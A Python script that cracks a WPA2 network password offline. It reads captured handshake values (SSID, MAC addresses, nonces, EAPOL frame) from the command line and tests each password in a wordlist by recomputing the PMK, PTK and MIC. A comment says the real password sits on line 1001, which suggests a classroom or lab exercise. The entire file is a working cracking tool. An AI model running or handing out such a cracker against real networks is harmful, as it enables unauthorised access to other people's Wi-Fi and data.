import hashlib
import hmac
import sys            
import pathlib

# sort 2 equal-sized byte arrays [descending order]
def sort(lt, rt):
    if len(lt) != len(rt):
        raise "Error: length mismatch"
    ltList = list(bytes(lt))
    rtList = list(bytes(rt))

    for i in range(0,len(ltList)):
        if ltList[i] > rtList[i]:
            return (lt,rt)
        elif rtList[i] > ltList[i]:
            return (rt,lt)
    return (lt,rt)


# parameters list
SSID = sys.argv[1]
ap_mac = bytearray.fromhex(sys.argv[2])
sta_mac = bytearray.fromhex(sys.argv[3])
ap_nonce = bytearray.fromhex(sys.argv[4])
sta_nonce = bytearray.fromhex(sys.argv[5])
eapol = bytearray.fromhex(sys.argv[6])

eapol_zero_mic = b''.join([ eapol[:81], b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0', eapol[97:99] ])
mic = eapol[81:97]


#password-file
pwd_dir = str(pathlib.Path(__file__).parent.resolve()) + '/files'
pwd_file = open(pwd_dir + '/' + 'pwd-list.txt','r')  #actual password in line 1001


# WPA2 Cracking
max_mac, min_mac = sort(ap_mac, sta_mac)
max_nonce, min_nonce = sort(ap_nonce, sta_nonce)

message = b''.join([
    b'Pairwise key expansion\x00',
    min_mac,
    max_mac,
    min_nonce,
    max_nonce,
    b'\x00'
])

for pwd_guess in pwd_file: # try all the passwords
    pwd_guess = pwd_guess[:-1]
    pwd_guess = ''.join(pwd_guess).encode()

    pmk = hashlib.pbkdf2_hmac('sha1', pwd_guess, SSID.encode(), 4096, 32)
    ptk = hmac.new(pmk, message, hashlib.sha1).digest()
    kck = ptk[:16]
    computed_mic = hmac.new(kck, eapol_zero_mic, hashlib.sha1).digest()[:16]

    if computed_mic == mic:
        print(pwd_guess.decode('ASCII'),end='')
        sys.exit(0)

print('',end='')
sys.exit(1)
